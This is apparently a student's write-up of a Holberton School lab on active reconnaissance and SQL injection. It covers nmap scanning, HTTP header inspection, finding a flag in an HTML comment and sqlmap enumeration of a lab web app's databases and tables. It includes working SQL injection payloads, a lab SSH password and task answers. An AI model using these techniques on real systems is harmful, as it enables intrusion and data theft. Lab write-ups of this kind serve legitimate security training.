# Active Reconnaissance

- Ubuntu server, `10.42.134.68`
- cyber_netsec_0x02, `10.42.23.23`
- ssh to ubuntu
```bash
ssh -p 13702 root@ssh.cod-eu-west-3.hbtn.io
# Password: ef646829df094d8cb2643015bce88a02

# install iputils-ping
apt update
apt install -y iputils-ping

# ping cyber_netsec
ping 10.42.23.23
# PING 10.42.23.23 (10.42.23.23) 56(84) bytes of data.
# 64 bytes from 10.42.23.23: icmp_seq=1 ttl=127 time=1.39 ms

# install nmap
apt update && apt install -y nmap

# add active.hbtn to /etc/hosts
echo "10.42.23.23 active.hbtn" >> /etc/hosts

# scan all ports
nmap -p- active.hbtn
# Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-15 19:32 UTC
# Nmap scan report for active.hbtn (10.42.23.23)
# Host is up (0.00060s latency).
# Not shown: 65534 closed ports
# PORT   STATE SERVICE
# 80/tcp open  http
# MAC Address: 0A:C4:AE:24:CC:17 (Unknown)
# 
# Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds

## on localhost save the port 80 to file 0-ports.txt
## echo 80 >0-ports.txt
## verify result
```

## Task 1 - inspect website

```bash

# get the HTTP header response
curl -I http://active.hbtn
# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 15 Jun 2026 19:47:38 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 4154
# Connection: keep-alive
# Vary: Cookie

## on localhost save "webserver_name webserver_version" to 1-webserver.txt
## echo "nginx 1.18.0" > 1-webserver.txt
## verify result
```

## Task 2: 100-flag.txt

```bash
curl http://active.hbtn
# ...
#     <footer>
#         Copyright &copy; 2023 Holberton School Inc, All rights reserved.
#     </footer>
#     
#     <!-- Dont forget to delete this comment please
#          Holberton Sec Lab - f39ee8f104e2222c280206a72874f43d -->
#     
# </body>
# </html>

## on localhost save the flag to 100-flag.txt
## echo f39ee8f104e2222c280206a72874f43d > 100-flag.txt
## verify result
```

## Task 3: put vulnerable pages in `2-injectable.txt`

```bash

# browse site, search for links, identify vulnerable page
curl -s http://active.hbtn | grep -oE 'href="[^"]+"'
# href="/static/css/style.css"
# href="/static/css/all.css"
# href="/static/css/products.css"
# href="/static/css/home.css"
# href="/"
# href="/products"
# href="/orders"
# href="/contact"
# href="/login"
# href="/product/1"
# href="/product/2"
# href="/product/3"
# href="/product/4"
# href="/product/5"
# href="/product/6"
# href="/product/7"
# href="/product/8"
# href="/product/9"
# href="/product/10"
```

Suspicious: `/product`. 
The other links are all parameter-free static destinations. 
- `/products` (plural) is the catalog listing — it shows all products, takes no input, so there's nothing to inject into. 
- `/contact` and `/login` are forms
- `/` is the homepage. 

None of these look up a single record by an ID we control.

`/product/<id>` is different. Every one of those links — `/product/1`, `/product/2`, … `/product/10` — is the same endpoint with a number on the end. That number is a parameter we supply, and the server almost certainly uses it to fetch one row from a database, something like:
```sql
SELECT * FROM products WHERE id = <id>
```
If that `<id>` gets dropped straight into the query without sanitization, we control part of the SQL — that's the injectable surface.

```bash
## on local terminal
echo "/product" > 2-injectable.txt
## verify result
```


## Task 4: sql injection - database_name and tables_count

```bash
# install sqlmap
apt update && apt install -y sqlmap

# /product/1 seems a good candidate for injection
sqlmap -u "http://active.hbtn/product/1" --batch
#root@ef646829df094d8cb2643015bce88a02-2377118072:~# sqlmap -u "http://active.hbtn/product/1" --batch
#        ___
#       __H__
# ___ ___["]_____ ___ ___  {1.6.4#stable}
#|_ -| . [']     | .'| . |
#|___|_  [,]_|_|_|__,|  _|
#      |_|V...       |_|   https://sqlmap.org
#
#[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
# 
# [*] starting @ 20:48:16 /2026-06-15/
# 
# [20:48:16] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
# do you want to try URI injections in the target URL itself? [Y/n/q] Y
# [20:48:16] [INFO] testing connection to the target URL
# [20:48:17] [INFO] checking if the target is protected by some kind of WAF/IPS
# [20:48:17] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
# are you sure that you want to continue with further target testing? [Y/n] Y
# [20:48:17] [WARNING] please consider usage of tamper scripts (option '--tamper')
# [20:48:17] [INFO] testing if the target URL content is stable
# [20:48:17] [INFO] target URL content is stable
# [20:48:17] [INFO] testing if URI parameter '#1*' is dynamic
# [20:48:17] [INFO] URI parameter '#1*' appears to be dynamic
# [20:48:17] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
# [20:48:17] [INFO] testing for SQL injection on URI parameter '#1*'
# [20:48:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [20:48:18] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Product 1")
# [20:48:18] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
# it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
# for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
# [20:48:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
# [20:48:18] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
# [20:48:18] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
# [20:48:18] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
# [20:48:18] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [20:48:18] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
# [20:48:18] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
# [20:48:18] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
# [20:48:18] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
# [20:48:18] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
# [20:48:18] [INFO] testing 'Generic inline queries'
# [20:48:18] [INFO] testing 'MySQL inline queries'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
# [20:48:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
# [20:48:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
# [20:48:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
# [20:48:29] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
# [20:48:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
# [20:48:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
# [20:48:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
# [20:48:30] [INFO] target URL appears to have 4 columns in query
# [20:48:31] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
# URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
# sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
# ---
# Parameter: #1* (URI)
#     Type: boolean-based blind
#     Title: AND boolean-based blind - WHERE or HAVING clause
#     Payload: http://active.hbtn:80/product/1' AND 9905=9905 AND 'JkNc'='JkNc
# 
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: http://active.hbtn:80/product/1' AND (SELECT 9199 FROM (SELECT(SLEEP(5)))LXUs) AND 'kvVH'='kvVH
# 
#     Type: UNION query
#     Title: Generic UNION query (NULL) - 4 columns
#     Payload: http://active.hbtn:80/product/1' UNION ALL SELECT NULL,CONCAT(0x716b6a7a71,0x566a44484e5050555261514c686a6f6f6956557845526d77525479575a527749515555636653594e,0x71716a7071),NULL,NULL-- -
# ---
# [20:48:31] [INFO] the back-end DBMS is MySQL
# web application technology: Nginx 1.18.0
# back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
# [20:48:31] [WARNING] HTTP error codes detected during run:
# 405 (Method Not Allowed) - 1 times, 500 (Internal Server Error) - 43 times
# [20:48:31] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/active.hbtn'
# [20:48:31] [WARNING] your sqlmap version is outdated
# 
# [*] ending @ 20:48:31 /2026-06-15/
```

The gist of the sqlmap:

- `/product/1` is vulnerable to SQL injection.
- Injection is in the URI path itself: `/product/1`
- Backend database is MySQL, likely MariaDB.
- The query has 4 columns.
- sqlmap found boolean-based blind, time-based blind, and UNION-based injection.


```bash
# list databases
sqlmap -u "http://active.hbtn/product/1" --dbs --batch
# ---
# ---
# [21:03:13] [INFO] the back-end DBMS is MySQL
# web application technology: Nginx 1.18.0
# back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
# [21:03:13] [INFO] fetching database names
# available databases [4]:
# [*] active.hbtn
# [*] information_schema
# [*] mysql
# [*] performance_schema
# 
# [21:03:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/active.hbtn'
# [21:03:13] [WARNING] your sqlmap version is outdated
# 
# [*] ending @ 21:03:13 /2026-06-15/
```
Ignoring system DBs like:
```sql
information_schema
mysql
performance_schema
sys
```

That leaves us with `active.hbtn`

On local terminal save this:
```bash
echo "active.hbtn" > 3-database.txt
```

### Searching tables in DB `active.hbtn`

```bash
sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" --tables --batch

# ...
# 
# [21:13:09] [INFO] fetching tables for database: 'active.hbtn'
# Database: active.hbtn
# [4 tables]
# +----------+
# | Admins   |
# | Orders   |
# | Products |
# | Users    |
# +----------+
# 
# [21:13:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/active.hbtn'
# [21:13:09] [WARNING] your sqlmap version is outdated
# 
# [*] ending @ 21:13:09 /2026-06-15/
```

4 tables have bee found:
- Admins
- Orders
- Products
- Users

On local terminal store the result
```bash
echo "4" > 4-tables.txt
```

Verify result.